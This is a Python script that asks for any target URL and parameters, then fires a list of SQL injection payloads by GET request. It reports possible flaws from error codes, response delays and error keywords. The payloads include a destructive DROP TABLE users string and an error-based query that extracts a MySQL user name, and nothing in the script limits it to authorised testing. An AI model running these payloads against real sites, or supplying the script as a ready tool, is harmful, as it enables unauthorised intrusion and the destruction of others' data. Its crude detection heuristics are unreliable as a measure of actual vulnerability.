import requests
import time

def get_user_input():
    url = input("Enter the target URL: ")
    params = input("Enter the parameters to test (comma-separated): ").split(',')
    return url, [param.strip() for param in params]

def check_sql_injection(url, params):
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='2",
        "' UNION SELECT NULL--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' AND SLEEP(5)--",  # Time-based payload
        "' OR '1'='1' /*",  # Comment-based payload
        "'; DROP TABLE users; --",  # Potential destructive payload
        "' UNION ALL SELECT NULL, version() --",  # Get DB version information
        "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT user FROM mysql.db LIMIT 0,1), ':', floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) y) z)--",  # Blind SQL Injection
        "'; --",  # Simple comment to manipulate the SQL
        "' AND 'x'='x",  # Common true condition
    ]
    
    error_keywords = ["error", "exception", "sql", "syntax", "database", "mysql", "warning", "violations"]
    
    for param in params:
        for payload in sql_payloads:
            # Test with GET request
            test_url = f"{url}?{param}={payload}"
            try:
                start_time = time.time()
                response = requests.get(test_url)
                response_time = time.time() - start_time
                status_code = response.status_code
                response_text = response.text.lower()

                # Detecting based on status codes
                if status_code == 500:
                    print(f"Potential SQL Injection vulnerability detected (status code 500) on {test_url}")
                
                # Checking for time-based delays
                if "' AND SLEEP(5)--" in payload and response_time >= 5:
                    print(f"Potential time-based SQL Injection detected (delay response) on {test_url}")
                
                # Checking for known error patterns in the response body
                if any(keyword in response_text for keyword in error_keywords):
                    print(f"Potential SQL Injection vulnerability detected in response body on {test_url}")
                
                # If response content changes significantly (indication of successful injection)
                if "success" in response_text and len(response_text) > 1000:  # Example heuristic for large responses
                    print(f"Potential SQL Injection vulnerability detected (unexpected content size) on {test_url}")

            except requests.exceptions.RequestException as e:
                print(f"Error occurred during request to {test_url}: {e}")

# Main function
if __name__ == "__main__":
    url, params = get_user_input()
    check_sql_injection(url, params)
